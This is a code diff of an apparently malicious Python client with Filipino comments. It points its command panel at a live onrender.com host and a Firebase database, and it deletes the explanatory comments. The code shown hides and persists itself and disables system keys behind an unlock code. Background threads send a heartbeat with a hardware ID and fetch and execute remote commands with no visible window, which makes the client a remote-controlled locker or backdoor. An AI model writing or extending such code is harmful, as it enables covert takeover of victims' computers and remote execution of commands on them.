@@ -12,7 +12,7 @@ import requests
 import uuid
 
 UNLOCK_CODE = "VIP123"
-PANEL_URL = "http://127.0.0.1:5000/api/heartbeat"  # Palitan ng Render URL kapag naka-deploy na
+PANEL_URL = "https://vipchaetos.onrender.com/api/heartbeat"  # Palitan ang <ang-render-app-mo> ng iyong totoong Render App URL
 
 if getattr(sys, 'frozen', False):
     current_path = sys.executable
@@ -63,7 +63,6 @@ def get_hwid():
         pass
     return str(uuid.getnode())
 
-# Background Heartbeat Thread para sa status ng client
 def heartbeat_loop():
     hwid = get_hwid()
     while True:
@@ -74,10 +73,8 @@ def heartbeat_loop():
             pass
         time.sleep(10)
 
-# Bagong Thread para makinig at mag-execute ng mga utos mula sa Web Panel / Firebase
 def command_listener_loop():
     hwid = get_hwid()
-    # Gumagamit ng Firebase REST API para i-check kung may pending action ang HWID na ito
     db_url = f"https://vipchaetos-default-rtdb.firebaseio.com/clients/{hwid}/pending_action.json"
     
     creation_flags = getattr(subprocess, 'CREATE_NO_WINDOW', 0)
@@ -88,10 +85,8 @@ def command_listener_loop():
             if response.status_code == 200 and response.json():
                 action = response.json()
                 
-                # Burahin agad sa database para hindi paulit-ulit na ma-execute
                 requests.delete(db_url)
 
-                # Pag-execute ng mga napindot na button mula sa panel
                 if action == 'uninstall':
                     bat_path = os.path.join(os.getenv('TEMP'), "App-Uninstaller-Combined.bat")
                     if os.path.exists(bat_path):
@@ -159,11 +154,9 @@ def check_password(event=None):
 hide_and_persist()
 disable_system_keys()
 
-# Simulan ang background heartbeat thread
 t_heartbeat = threading.Thread(target=heartbeat_loop, daemon=True)
 t_heartbeat.start()
 
-# Simulan ang background command listener thread para gumana na ang mga buttons
 t_command = threading.Thread(target=command_listener_loop, daemon=True)
 t_command.start()
 
